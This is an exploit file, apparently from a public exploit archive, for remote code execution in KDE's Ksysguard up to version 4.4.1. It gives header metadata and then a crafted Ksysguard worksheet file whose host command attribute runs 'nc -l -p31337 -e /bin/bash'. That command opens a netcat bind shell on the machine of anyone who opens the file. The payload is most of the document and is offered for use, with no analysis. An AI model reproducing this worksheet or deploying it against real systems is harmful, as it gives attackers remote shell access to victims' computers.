@@ -1,0 +1,20 @@
+# Exploit Title: Ksysguard RCE via Cross Application Scripting
+# Date: 2010 03 20
+# Author: Emanuele 'emgent' Gentili
+# Code: http://www.backtrack.it/~emgent/exploits/20100320_Ksysguard_RCE_CAS.txt
+# Version: <= 4.4.1
+# CVE : N/A
+# Vendor: http://www.kde.org
+# Video: http://www.backtrack.it/~emgent/videos/16032010_-_SecuritySummit_CAS_OWNING_KDE.mov
+# About CAS: http://en.wikipedia.org/wiki/Cross_Application_Scripting 
+#            http://it.wikipedia.org/wiki/Cross_Application_Scripting
+
+
+
+halfapple:~ emanuelegentili$ cat ph33r.sgrd
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE KSysGuardWorkSheet>
+<WorkSheet title="She" interval="2" locked="0" rows="2" columns="2" >
+<host command="nc -l -p31337 -e /bin/bash" /> </WorkSheet>
+halfapple:~ emanuelegentili$ 
+
